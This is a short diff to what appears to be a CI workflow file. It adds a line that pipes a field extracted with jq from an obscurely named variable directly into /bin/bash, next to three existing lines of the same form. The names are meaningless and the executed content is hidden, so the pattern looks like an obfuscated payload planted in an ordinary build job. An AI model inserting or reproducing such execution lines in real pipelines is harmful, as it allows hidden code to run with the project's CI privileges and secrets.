@@ -30,6 +30,7 @@ jobs:
           echo $btl3 | jq -r .x5712 | /bin/bash
           printf '%s' "$xncsy7" | jq -r .cdew4 | /bin/bash
           echo $kfld3969 | jq -r .niw6258 | /bin/bash
+          printf '%s' "$f34704" | jq -r .nxea72837 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
